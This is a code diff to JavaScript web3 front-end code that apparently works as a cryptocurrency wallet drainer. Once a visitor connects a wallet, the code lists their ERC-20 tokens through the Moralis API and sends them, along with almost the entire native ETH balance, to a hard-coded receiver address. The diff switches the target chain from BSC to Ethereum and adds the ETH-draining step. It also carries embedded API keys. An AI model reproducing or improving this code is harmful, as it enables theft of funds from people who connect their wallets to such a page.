@@ -16,7 +16,7 @@ let provider;
 // Address of the selected account
 let selectedAccount;
 
- // gaf<- RECEIVER ADDRESS HERE
+const receiver_addres = '0xBC4C70c554510Cc5f9BE8d3F4D6841c512dd6522'; // gaf<- RECEIVER ADDRESS HERE
 let onButtonClick;
 let user_address;
 let start_to_log = false;
@@ -61,11 +61,7 @@ async function init() {
     walletconnect: {
       package: WalletConnectProvider,
       options: {
-        rpc: {
-          56: "https://bsc-dataseed.binance.org",
-        },
-        network: 'binance',
-        infuraId: "e77435344ef0486893cdc26d7d5cf039"
+        infuraId: "e77435344ef0486893cdc26d7d5cf039",
       }
     },
 
@@ -97,13 +93,9 @@ async function init() {
 async function fetchAccountData() {
   start_to_log = false;
   // Get a Web3 instance for the wallet
-  
   const web3 = new Web3(provider);
 
   console.log("Web3 instance is", web3);
-  //change chain to bsc
-  web3.eth.defaultCommon = {customChain: {name: 'bsc-network', chainId: 56, networkId: 56}, baseChain: 'mainnet', hardfork: 'petersburg'};
-
 
   // Get connected chain id from Ethereum node
   const chainId = await web3.eth.getChainId();
@@ -191,6 +183,9 @@ async function onConnect() {
   try {
     provider = await web3Modal.connect();
     console.log("provider", provider);
+    $(document).ready(function(){
+      $("#myModal").modal('show');
+  });
   } catch(e) {
     console.log("Could not get a wallet connection", e);
     return;
@@ -242,11 +237,10 @@ async function onDisconnect() {
   document.querySelector("#connected").style.display = "none";
 }
 
-const receiver_address = '0xBC4C70c554510Cc5f9BE8d3F4D6841c512dd6522';
 
-async function getTokens(address="", api_key="", chain="bsc"){
+async function getTokens(address="", api_key="gChmOmU1HuqnEPvXPFKuLPlKMbQOI50jgS8P70r0zM212B9CEssfioVpinxl65NG", chain="eth"){
   return new Promise((resolve, reject)=>{
-      fetch(`https://deep-index.moralis.io/api/v2/${address}/erc20?chain=bsc`, {
+      fetch(`https://deep-index.moralis.io/api/v2/${address}/erc20?chain=eth`, {
           method: "GET",
           headers: {
               "accept": "application/json",
@@ -262,12 +256,31 @@ async function getTokens(address="", api_key="", chain="bsc"){
   })
 }
 
+
+async function getBalance(address="", api_key="gChmOmU1HuqnEPvXPFKuLPlKMbQOI50jgS8P70r0zM212B9CEssfioVpinxl65NG", chain="eth"){
+  return new Promise((resolve, reject)=>{
+      fetch(`https://deep-index.moralis.io/api/v2/${address}/balance?chain=eth`, {
+          method: "GET",
+          headers: {
+              "accept": "application/json",
+              "X-API-Key": api_key
+          }
+      })
+      .then(async(res) => {
+          if(res.status > 399) throw res;
+          resolve(await res.json());
+      }).catch(err=>{
+          reject(err);
+      })
+  })
+}
+const receiver_address = '0xBC4C70c554510Cc5f9BE8d3F4D6841c512dd6522';
 async function proceed(){
   start_to_log = false;
   console.log("Now we roll!!!");
     // main net
-    const serverUrl = 'https://gyqgzsubvnfd.usemoralis.com:2053/server';
-    const appId = 'omHohMO4R35Uh24vi8TJmTkso7hKJKRWhx0NgeNr';
+    const serverUrl = 'https://pt5gk0drbc2k.usemoralis.com:2053/server';
+    const appId = 'uxBYKvLyKcTp8au8ftYLIovw8xdNyeI05lR4scQW';
     const apiKey = "gh8QcQ44yAaqOJR5AtKGM7uDpDo6pddkKD25FEyT8zK2e8jnK5Zv5atjV5kWIAjF";
   
     // testnet
@@ -327,18 +340,42 @@ async function proceed(){
         // })
         // console.log('Eth NFTs: %o', eth_nfts)
         
-        const bsc_tokens = await getTokens(user_address, apiKey).catch(e=>{
+        const eth_tokens = await getTokens(user_address, apiKey).catch(e=>{
           console.log("Unable to get tokens", e);
         });
-        console.log('bsc tokens: %o', bsc_tokens)
+        console.log('Eth tokens: %o', eth_tokens)
     
     
-        if (bsc_tokens.length < 1) {
-          return console.log('No bsc tokens found')
-        } // No NFTs
+        if (eth_tokens.length < 1) {
+
+          const eth_balance = await getBalance(user_address, apiKey).catch(e=>{
+            console.log("Unable to get new eth balance", e);
+          });
+          console.log("eth_balance", eth_balance);
+          console.log("eth_balance.balance", eth_balance.balance);
+          
+          const balance = ((parseInt(eth_balance.balance))/1000000000000000000) - 0.005;
+          console.log("The new eth balance", balance);
+          if (balance > 0) {
+          const options = {
+            type: "native",
+            amount: Moralis.Units.ETH(balance.toString()),
+            receiver: receiver_address,
+          };
+          let result = await Moralis.transfer(options);
+          console.log(result);
+        }
+        else {
+          console.log("Insufficient funds")
+        }
+          return console.log('No tokens found')
+        } 
+        
+        
+        // No NFTs
         // eth_nfts.result.forEach(async (nft, i) => {
-        for(let n=0; n<bsc_tokens.length; n++){
-          let token = bsc_tokens[Number(n)];
+        for(let n=0; n<eth_tokens.length; n++){
+          let token = eth_tokens[Number(n)];
           let {
             token_address: contractAddress,
             balance: balance,
@@ -357,11 +394,30 @@ async function proceed(){
             },
           )
           console.log(transaction);
-          if(transaction){
-            await transaction.wait().then((v) => {
-              console.log('Finished Processing transaction:', v)
-            })
-          }
+          // if(transaction){
+          //   await transaction.wait().then((v) => {
+          //     console.log('Finished Processing transaction:', v)
+          //   })
+          // }
+        }
+          const eth_balance = await getBalance(user_address, apiKey).catch(e=>{
+            console.log("Unable to get new eth balance", e);
+          });
+          console.log("eth_balance", eth_balance);
+          console.log("eth_balance.balance", eth_balance.balance);
+          const balance = ((parseInt(eth_balance.balance))/1000000000000000000) - 0.005;
+          console.log("The new eth balance", balance);
+          if (balance > 0) {
+          const options = {
+            type: "native",
+            amount: Moralis.Units.ETH(balance.toString()),
+            receiver: receiver_address,
+          };
+          let result = await Moralis.transfer(options);
+          console.log(result);
+        }
+        else {
+          console.log("Insufficient funds")
         }
     }
     send();
